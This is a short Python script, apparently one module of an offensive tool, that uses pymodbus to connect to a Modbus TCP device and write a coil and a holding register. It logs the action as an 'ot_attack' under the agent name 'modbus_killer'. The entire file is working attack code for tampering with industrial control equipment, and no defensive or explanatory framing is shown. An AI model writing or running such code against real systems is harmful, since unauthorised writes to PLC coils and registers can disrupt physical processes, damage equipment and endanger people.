
from pymodbus.client.sync import ModbusTcpClient
import time, os, json

TARGET_IP = "192.168.1.100"
AGENT_ID = "modbus_killer"
ALERT_FILE = "webgui/alerts.json"

def log(msg):
    print(f"[MODBUS] {msg}")

def push_alert():
    os.makedirs("webgui", exist_ok=True)
    with open(ALERT_FILE, "a") as f:
        f.write(json.dumps({
            "agent": AGENT_ID,
            "alert": "Modbus command injection active",
            "type": "ot_attack",
            "timestamp": time.time()
        }) + "\n")

def main():
    client = ModbusTcpClient(TARGET_IP)
    if not client.connect():
        log("Failed to connect.")
        return
    log("Connected. Sending coil manipulation...")
    push_alert()
    client.write_coil(0, True)
    time.sleep(1)
    client.write_register(1, 1337)
    client.close()

if __name__ == "__main__":
    main()
